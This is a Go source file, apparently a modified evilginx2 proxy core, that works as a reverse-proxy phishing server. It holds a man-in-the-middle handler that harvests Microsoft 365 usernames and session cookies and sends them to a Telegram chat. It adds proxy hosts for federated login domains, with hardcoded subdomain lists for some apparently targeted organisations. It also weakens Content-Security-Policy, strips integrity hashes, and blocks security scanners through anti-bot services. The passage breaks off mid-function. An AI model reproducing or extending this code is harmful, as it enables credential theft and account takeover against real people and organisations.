/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bobesa/go-domain-util/domainutil"
	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/inconshreveable/go-vhost"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	http_dialer "github.com/mwitkow/go-http-dialer"
	"golang.org/x/net/proxy"
	"h12.io/socks"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second

	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
)

func subFilterExists(trigger string, to_compare SubFilter, subfilters map[string][]SubFilter) (result bool) {
	result = false
	for hostname, slice := range subfilters {
		if hostname != trigger {
			continue
		}
		for _, filter := range slice {
			isSame := to_compare.domain == filter.domain &&
				to_compare.subdomain == filter.subdomain &&
				to_compare.regexp == filter.regexp &&
				to_compare.replace == filter.replace

			if isSame {
				result = true
				break
			}
		}
	}
	return result
}

func proxyHostExists(to_compare ProxyHost, slice []ProxyHost) (result bool) {
	result = false
	for _, filter := range slice {
		isSame := to_compare.domain == filter.domain &&
			to_compare.orig_subdomain == filter.orig_subdomain

		if isSame {
			result = true
			break
		}
	}
	return result
}

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	available_proxies []string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	telegram_bot      *tgbotapi.BotAPI
	telegram_chat_id  int64
	HttpClient        *http.Client
}

type ProxySession struct {
	SessionId   string
	Created     bool
	PhishDomain string
	Index       int
}

func (p *HttpProxy) NotifyWebhook(msg string) {
	if p.telegram_bot != nil {
		// creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
		creds := tgbotapi.MessageConfig{
			BaseChat: tgbotapi.BaseChat{
				ChatID:           p.telegram_chat_id,
				ReplyToMessageID: 0,
			},
			Text:                  msg,
			DisableWebPagePreview: false,
			ParseMode: "html",
		}
		if _, err := p.telegram_bot.Send(creds); err != nil {
			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
		}
	}

}

func (p *HttpProxy) SendCookies(id, msg string) {
	if p.telegram_bot != nil {
		cookies := tgbotapi.NewDocument(p.telegram_chat_id, tgbotapi.FileBytes{
			Name:  fmt.Sprintf("[%s]_cookies_[%s].json",id, id),
			Bytes: []byte(msg),
		})
		if _, err := p.telegram_bot.Send(cookies); err != nil {
			log.Error("failed to send telegram cookie webhook with length %v: %s", len(msg), err)
		}
	}

}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, proxies []string, developer bool) (*HttpProxy, error) {
	// By increasing connection per host and the total number of idle connection, this will increase the performance and serve more request with minimal server resources.
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.MaxIdleConns = 100
	t.MaxConnsPerHost = 100
	t.MaxIdleConnsPerHost = 100

	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		available_proxies: proxies,
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
		HttpClient: &http.Client{
			Timeout:   10 * time.Second,
			Transport: t,
		},
		telegram_bot: nil,
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		// TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	if cfg.proxyEnabled {
		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
		}
	}

	if len(cfg.webhook_telegram) > 0 {
		confSlice := strings.Split(cfg.webhook_telegram, "/")
		if len(confSlice) != 2 {
			log.Fatal("telegram config not in correct format: <bot_token>/<chat_id>")
		}
		bot, err := tgbotapi.NewBotAPI(confSlice[0])
		if err != nil {
			log.Fatal("telegram NewBotAPI: %v", err)
		}
		p.telegram_bot = bot
		p.telegram_chat_id, _ = strconv.ParseInt(confSlice[1], 10, 64)
	}

	p.cookieName = GenRandomString(4)
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:   "",
				Created:     false,
				PhishDomain: "",
				Index:       -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			from_ip := GetUserIP(nil, req)
			if req.Header.Get("Contabo-IP") != "" {
				from_ip = req.Header.Get("Contabo-IP")
			}
			
			from_agent := req.Header.Get("User-Agent")
			hostname := p.bl.GetISP(from_ip)
			if p.bl.IsBlacklisted(from_ip) {
				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
				return p.blockRequest(req)
			}
			if p.bl.IsBlacklistedAgent(from_agent) {
				p.bl.AddIP(from_ip)
				log.Warning("blacklist: request from useragent '%s' was blocked", from_agent)
				return p.blockRequest(req)
			}
			if hostname != "nil" && p.bl.IsBlacklistedHost(hostname) {
				p.bl.AddIP(from_ip)
				log.Warning("blacklist: request from hostname %s was blocked", hostname)
				return p.blockRequest(req)
			}
			if p.cfg.GetBlacklistMode() == "all" {
				log.Warning("blacklist: request from hostname %s was blocked", hostname)
				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
				log.Warning("blacklist: request from useragent '%s' was blocked", from_agent)
				return p.blockRequest(req)
			}
	
	/*			if !p.isWhitelistedIP(from_ip) {
		  		if real_visitor := p.Is_Real_Visitor_IPinfo(from_ip); !real_visitor {					
		  			p.bl.AddIP(from_ip)
		  			log.Debug("simplebot: request from ip address '%s' was blocked", from_ip)
		  			return p.blockRequest(req)
		  		}
		  	}
*/	

			if !p.isWhitelistedIP(from_ip) && p.cfg.nkpbotEnabled {
				if real_visitor := p.Is_Real_Visitor_Nkpbot(from_ip, req.Header.Get("User-Agent")); !real_visitor {
					if !log.DebugEnabled() {
						err := p.bl.AddIP(from_ip)
						if err != nil {
							log.Error("nkpbot: failed to blacklist ip address: %s - %s", from_ip, err)
						} else {
							log.Debug("nkpbot: blacklisted ip address: %s", from_ip)
						}
					}
					log.Debug("nkpbot: request from ip address '%s' was blocked", from_ip)
					return p.blockRequest(req)
				}
			}

/*			if !p.isWhitelistedIP(from_ip) && p.cfg.simplebotEnabled {
				if real_visitor := p.Is_Real_Visitor_IPinfo(from_ip); !real_visitor {
					if !log.DebugEnabled() {
						err := p.bl.AddIP(from_ip)
						if err != nil {
							log.Error("simplebot: failed to blacklist ip address: %s - %s", from_ip, err)
						} else {
							log.Debug("simplebot: blacklisted ip address: %s", from_ip)
						}
					}
					log.Debug("simplebot: request from ip address '%s' was blocked", from_ip)
					return p.blockRequest(req)
				}
			}

*/			


			if !p.isWhitelistedIP(from_ip) && p.cfg.killbotEnabled && len(p.cfg.killbot_apikey) > 0 {
				if real_visitor := p.Is_Real_Visitor_Killbot(from_ip, req.Header.Get("User-Agent")); !real_visitor {
					if !log.DebugEnabled() {
						err := p.bl.AddIP(from_ip)
						if err != nil {
							log.Error("killbot: failed to blacklist ip address: %s - %s", from_ip, err)
						} else {
							log.Debug("killbot: blacklisted ip address: %s", from_ip)
						}
					}
					log.Debug("killbot: request from ip address '%s' was blocked", from_ip)
					return p.blockRequest(req)
				}
			}
			if !p.isWhitelistedIP(from_ip) && p.cfg.antibotpwEnabled && len(p.cfg.antibotpw_apikey) > 0 {
				if real_visitor := p.Is_Real_Visitor_Antibot(from_ip, req.Header.Get("User-Agent")); !real_visitor {
					if !log.DebugEnabled() {
						err := p.bl.AddIP(from_ip)
						if err != nil {
							log.Error("antibo.pwt: failed to blacklist ip address: %s - %s", from_ip, err)
						} else {
							log.Debug("antibot.pw: blacklisted ip address: %s", from_ip)
						}
					}
					log.Debug("antibot.pw: request from ip address '%s' was blocked", from_ip)
					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
			}

			parts := strings.SplitN(req.RemoteAddr, ":", 2)
			remote_addr := parts[0]
			if req.Header.Get("Contabo-IP") != "" {
				remote_addr = req.Header.Get("Contabo-IP")
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if req.Method == "POST" {
				ip := GetUserIP(nil, req)
				if req.URL.Path == "/ImplementOutOfTheBoxContent" {
					phished = p.ValidateTurnstileCaptcha(ip, req.PostForm["cf-turnstile-response"][0])
				}
				if req.URL.Path == "/VisualizeAutomatedMetrics" {
					phished = p.ValidateRecaptcha(ip, req.PostForm["g-recaptcha-response"][0])
				}
			}

			isCredRequest := strings.Contains(req_url, "common/GetCredentialType")
			if isCredRequest {
				contents, err := io.ReadAll(req.Body)
				if err != nil {
					log.Error("ReadAll: %v", err)
				}
				defer req.Body.Close()

				type GCTformat struct {
					Username                       string `json:"username"`
					IsOtherIdpSupported            bool   `json:"isOtherIdpSupported,omitempty"`
					CheckPhones                    bool   `json:"checkPhones,omitempty"`
					IsRemoteNGCSupported           bool   `json:"isRemoteNGCSupported,omitempty"`
					IsCookieBannerShown            bool   `json:"isCookieBannerShown,omitempty"`
					IsFidoSupported                bool   `json:"isFidoSupported,omitempty"`
					OriginalRequest                string `json:"originalRequest,omitempty"`
					Country                        string `json:"country,omitempty"`
					Forceotclogin                  bool   `json:"forceotclogin,omitempty"`
					IsExternalFederationDisallowed bool   `json:"isExternalFederationDisallowed,omitempty"`
					IsRemoteConnectSupported       bool   `json:"isRemoteConnectSupported,omitempty"`
					FederationFlags                int    `json:"federationFlags,omitempty"`
					IsSignup                       bool   `json:"isSignup,omitempty"`
					FlowToken                      string `json:"flowToken,omitempty"`
					IsAccessPassSupported          bool   `json:"isAccessPassSupported,omitempty"`
				}
				var gct_reqdata GCTformat
				err = json.Unmarshal(contents, &gct_reqdata)
				if err != nil {
					log.Error("%v", err)
				}

				o365_pl := p.cfg.phishlets["o365"]

				sc, err := req.Cookie(p.cookieName)
				ok := false
				if err == nil {
					ps.Index, ok = p.sids[sc.Value]
					if ok {
						ps.SessionId = sc.Value
					}
				} else if err != nil && !p.isWhitelistedIP(remote_addr) {
					session, err := NewSession(o365_pl.Name)
					if err == nil {
						sid := p.last_sid
						p.last_sid += 1
						p.sessions[session.Id] = session
						p.sids[session.Id] = sid
						ps.SessionId = session.Id
						ps.Created = true
						ps.Index = sid
					}
				} else {
					ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
					if ok {
						ps.Index, ok = p.sids[ps.SessionId]
					}
				}
				if !ok {
					log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(o365_pl.Name), req_url, req.Header.Get("User-Agent"), remote_addr)
				}

				p.setSessionUsername(ps.SessionId, gct_reqdata.Username)
				log.Success("[%d] Username: [%s]", ps.Index, gct_reqdata.Username)
				if err := p.db.SetSessionUsername(ps.SessionId, gct_reqdata.Username); err != nil {
					log.Error("database: %v", err)
				}

				comp_req := GCTformat{Username: gct_reqdata.Username, OriginalRequest: gct_reqdata.OriginalRequest, IsOtherIdpSupported: gct_reqdata.IsOtherIdpSupported}
				json_data, err := json.Marshal(comp_req)
				if err != nil {
					log.Error("%v", err)
				}

				httpposturl := "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
				rresponse, err := http.Post(httpposturl, "application/json", bytes.NewBuffer(json_data))
				if err != nil {
					log.Error("%v", err)
				}

				resbody, err := io.ReadAll(rresponse.Body)
				if err != nil {
					log.Error("%v", err)
				}
				defer rresponse.Body.Close()

				type respmsg struct {
					Username       string `json:"Username"`
					Display        string `json:"Display"`
					IfExistsResult int    `json:"IfExistsResult"`
					IsUnmanaged    bool   `json:"IsUnmanaged"`
					ThrottleStatus int    `json:"ThrottleStatus"`
					Credentials    struct {
						PrefCredential        int         `json:"PrefCredential"`
						HasPassword           bool        `json:"HasPassword"`
						RemoteNgcParams       interface{} `json:"RemoteNgcParams"`
						FidoParams            interface{} `json:"FidoParams"`
						SasParams             interface{} `json:"SasParams"`
						CertAuthParams        interface{} `json:"CertAuthParams"`
						GoogleParams          interface{} `json:"GoogleParams"`
						FacebookParams        interface{} `json:"FacebookParams"`
						FederationRedirectURL string      `json:"FederationRedirectUrl"`
					} `json:"Credentials"`
					EstsProperties struct {
						DomainType int `json:"DomainType"`
					} `json:"EstsProperties"`
					IsSignupDisallowed bool   `json:"IsSignupDisallowed"`
					APICanary          string `json:"apiCanary"`
				}

				var res respmsg
				err = json.Unmarshal(resbody, &res)
				if err != nil {
					log.Error("%v", err)
				}

				redir_link := res.Credentials.FederationRedirectURL

				if len(redir_link) == 0 {
					log.Debug("FederationRedirectURL empty in JSON: [%v]", string(resbody))
					resbody = p.patchUrls(o365_pl, resbody, CONVERT_TO_PHISHING_URLS)
					cred_resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(resbody))
					return nil, cred_resp
				}

				redir_url, err := url.Parse(redir_link)
				if err != nil {
					log.Error("url.Parse: %v", err)
				}
				redir_hostname := redir_url.Hostname()
				domain := domainutil.Domain(redir_hostname)
				subdomain := domainutil.Subdomain(redir_hostname)
				subdomain_1level := strings.Split(subdomain, ".")[0]
				
				log.Debug("Proxy Host Redirect Hostname Log [%v] %v.%v (%v.%v)", redir_hostname, subdomain, domain, subdomain_1level, domain)
				if !proxyHostExists(ProxyHost{phish_subdomain: subdomain, orig_subdomain: subdomain, domain: domain}, o365_pl.proxyHosts) {
					o365_pl.addProxyHost(subdomain, subdomain, domain, true, false, false)
				}
				//site_subdomain_id := mrand.Intn(100)
				if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("%s", subdomain_1level), orig_subdomain: subdomain, domain: domain}, o365_pl.proxyHosts) {
					o365_pl.addProxyHost(fmt.Sprintf("%s", subdomain_1level), subdomain, domain, true, false, false)
				}
				site_subdomain_id_2 := mrand.Intn(100)
				if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("sso-%d", site_subdomain_id_2), orig_subdomain: "sso", domain: domain}, o365_pl.proxyHosts) {
					o365_pl.addProxyHost(fmt.Sprintf("sso-%d", site_subdomain_id_2), "sso", domain, true, false, false)
				}
				//site_subdomain_id_3 := mrand.Intn(100)
				if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("%s", subdomain), orig_subdomain: subdomain, domain: domain + ":443"}, o365_pl.proxyHosts) {
					o365_pl.addProxyHost(fmt.Sprintf("%s", subdomain,), subdomain, domain+":443", true, false, false)
				}
				site_subdomain_id_4 := mrand.Intn(100)
				if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("%s-%d", subdomain, site_subdomain_id_4), orig_subdomain: subdomain, domain: "okta.com"}, o365_pl.proxyHosts) {
					o365_pl.addProxyHost(fmt.Sprintf("%s-%d", subdomain, site_subdomain_id_4), subdomain, "okta.com", true, false, false)
				}
				// This causes connection to sometimes fail when connecting to login.microsoftonline.com
				if !subFilterExists(redir_hostname, SubFilter{subdomain: "login", domain: "microsoftonline.com", regexp: "{hostname}", replace: "{hostname}"}, o365_pl.subfilters) {
					o365_pl.addSubFilter(redir_hostname, "login", "microsoftonline.com", []string{"text/html", "application/json", "application/javascript"}, "{hostname}", "{hostname}", false, []string{})
				}
				if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: "{hostname}", replace: "{hostname}"}, o365_pl.subfilters) {
					o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html", "application/json", "application/javascript"}, "https://{hostname}", "https://{hostname}", false, []string{})
				}
				if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `<meta http-equiv="Content-Security-Policy" content="(.*?)"`, replace: `<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';"`}, o365_pl.subfilters) {
					o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html", "application/json", "application/javascript"}, `<meta http-equiv="Content-Security-Policy" content="(.*?)"`, `<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';"`, false, []string{})
				}
				if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `sha384-.{64}`, replace: ``}, o365_pl.subfilters) {
					o365_pl.addSubFilter(redir_hostname, subdomain, domain, p.auto_filter_mimes, `sha384-.{64}`, "", false, []string{})
				}
				if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: "okta.com", regexp: `{domain}`, replace: `{domain}`}, o365_pl.subfilters) {
					o365_pl.addSubFilter(redir_hostname, subdomain, "okta.com", p.auto_filter_mimes, `{domain}`, "{domain}", false, []string{})
				}
				safenetSubs := []string{"status.saspce", "status.eu", "status", "status.sta", "pki.us", "pki.eu", "eu", "us", "testacme", "acme", "www", "pki", "pce", "tmx.idp.eu", "tmx.idp", "tmx.idp.us", "www.tmx.idp.us"}
				winstonSubs := []string{"Email-cr", "Email-hk", "Email-ln", "Email-wm", "email.yuandawinston.com", "Mail", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "email.yuandawinston.com", "Mail", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "Mail", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "Mail", "owa-ch", "outlook-ch", "email-ch", "outlook-dc", "owa-dc", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "Mail", "email-ch", "email-cr", "email-hk", "email-ln", "email-wm", "mail", "email-wm", "email-cr", "email-wm", "mail", "email-cl", "email-hk", "email-pa", "email-sf", "email-dc", "email-la", "email-ho", "email-ny", "outlook-ny", "outlook-sf", "outlook-ln", "owa-ln", "certmail-wm", "email-wm", "email-ln", "email-cr", "certmail-wm", "email-wm", "email-wm"}
				novSubs := []string{"nov.kerberos", "autotallyassetportal", "Politemail", "Politemail-Read", "securelogin", "access", "owas", "mail", "access", "lseuraccess", "logindev", "lshouaccess", "login", "lsbjgaccess", "ls13gdyaccess", "eumail-old", "eurportal", "euportalcsg", "euowamail", "myaccount", "myaccountqa", "asiamail", "weurportal", "myaccountdev", "politemail-read", "mailbjg", "mailedm", "politemail", "spgdevportal", "mailgw01", "asiaowamail", "mail5sw", "sgpportal", "mailabd", "www.access", "seaportal", "lssngaccess", "accessdev", "maildst1", "mailgw02", "mail-old", "owamail", "owas-krs", "dsportalqas", "mailchl", "mailfra", "dhcustomerportal", "gdyportal", "canmail", "login", "www.login", "logindev", "www.logindev", "eumaildev", "dalportal", "eurportal", "gdyportal", "Portal", "scusportal", "seaportal", "uaenportal", "weurportal", "mail", "PoliteMail", "PoliteMail-Read", "www.PoliteMail", "SGPPortal", "dalportal", "eurportal", "gdyportal", "Portal", "seaportal", "mail", "rigportal", "owas", "webdamlogin", "eumail", "PoliteMail", "PoliteMail-Read", "mysupplierportal", "rigsupplierportal-prod", "myaccess", "mail", "eumail", "portal", "www.portal", "eurportal", "gdyportal", "portal", "sgpportal", "portaltest", "portal", "LsBjgAccess", "directaccess", "Eumail", "EuMail", "EUMail", "mail", "lshouaccess", "LsSngAccess", "Portal", "LsEurAccess", "Eumail", "mail", "Asiamail", "mail", "AsiaMail", "mail", "LS13GdyAccess", "asiamail", "canmail", "mail", "DirectAccess", "LsSngAccess", "euportal", "dhcustomerportal", "Asiamail", "mail", "Eumail", "EUMail"}
				for _, sub := range safenetSubs {
					subdomain_1level := strings.Split(sub, ".")[0]
					site_subdomain_id := mrand.Intn(100)
					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), orig_subdomain: sub, domain: domain}, o365_pl.proxyHosts) {
						o365_pl.addProxyHost(fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), sub, domain, true, false, true)
					}
					if !subFilterExists(redir_hostname, SubFilter{subdomain: sub, domain: domain, regexp: `{hostname}`, replace: `{hostname}`}, o365_pl.subfilters) {
						o365_pl.addSubFilter(redir_hostname, sub, domain, p.auto_filter_mimes, `{hostname}`, "{hostname}", false, []string{})
					}
				}
				for _, sub := range winstonSubs {
					subdomain_1level := strings.Split(sub, ".")[0]
					site_subdomain_id := mrand.Intn(100)
					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), orig_subdomain: sub, domain: domain}, o365_pl.proxyHosts) {
						o365_pl.addProxyHost(fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), sub, domain, true, false, true)
					}
					if !subFilterExists(redir_hostname, SubFilter{subdomain: sub, domain: domain, regexp: `{hostname}`, replace: `{hostname}`}, o365_pl.subfilters) {
						o365_pl.addSubFilter("myaccount."+domain, sub, domain, p.auto_filter_mimes, `{hostname}`, "{hostname}", false, []string{})
					}
				}
				for _, sub := range novSubs {
					subdomain_1level := strings.Split(sub, ".")[0]
					site_subdomain_id := mrand.Intn(100)
					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), orig_subdomain: sub, domain: domain}, o365_pl.proxyHosts) {
						o365_pl.addProxyHost(fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), sub, domain, true, false, true)
					}
					if !subFilterExists(redir_hostname, SubFilter{subdomain: sub, domain: domain, regexp: `{hostname}`, replace: `{hostname}`}, o365_pl.subfilters) {
						o365_pl.addSubFilter("myaccount."+domain, sub, domain, p.auto_filter_mimes, `{hostname}`, "{hostname}", false, []string{})
					}
				}
				p.cfg.phishlets["o365"] = o365_pl
				p.cfg.refreshActiveHostnames()
				resbody = p.patchUrls(o365_pl, resbody, CONVERT_TO_PHISHING_URLS)
				cred_resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(resbody))
				return nil, cred_resp
			}

			if phished {
				pl := p.getPhishletByPhishHost(req.Host)
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
				}

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					sc, err := req.Cookie(p.cookieName)
					if err != nil {// && !p.isWhitelistedIP(remote_addr)} {
						if !p.cfg.IsSiteHidden(pl_name) {
							var vv string
							var uv url.Values
							l, err := p.cfg.GetLureByPath(pl_name, req_path)
							if err == nil {
								log.Debug("triggered lure for path '%s'", req_path)
							} else {
								uv = req.URL.Query()
								vv = uv.Get(p.cfg.verificationParam)
							}
							if l != nil || vv == p.cfg.verificationToken {

								// check if lure user-agent filter is triggered
								if l != nil {
									if len(l.UserAgentFilter) > 0 {
										re, err := regexp.Compile(l.UserAgentFilter)
										if err == nil {
											if !re.MatchString(req.UserAgent()) {
												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
												return p.blockRequest(req)
											}
										} else {
											log.Error("lures: user-agent filter regexp is invalid: %v", err)
										}
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
  									//p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>A new visitor has arrived</u> : <code>%s (%s)</code>`, sid, sid, req.Header.Get("User-Agent"), remote_addr))
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									landing_url := req_url
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									if l != nil {
										session.RedirectURL = l.RedirectUrl
										session.PhishLure = l
										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
									} else {
										rv := uv.Get(p.cfg.redirectParam)
										if rv != "" {
											u, err := base64.URLEncoding.DecodeString(rv)
											if err == nil {
												session.RedirectURL = string(u)
												log.Debug("redirect URL (get): %s", u)
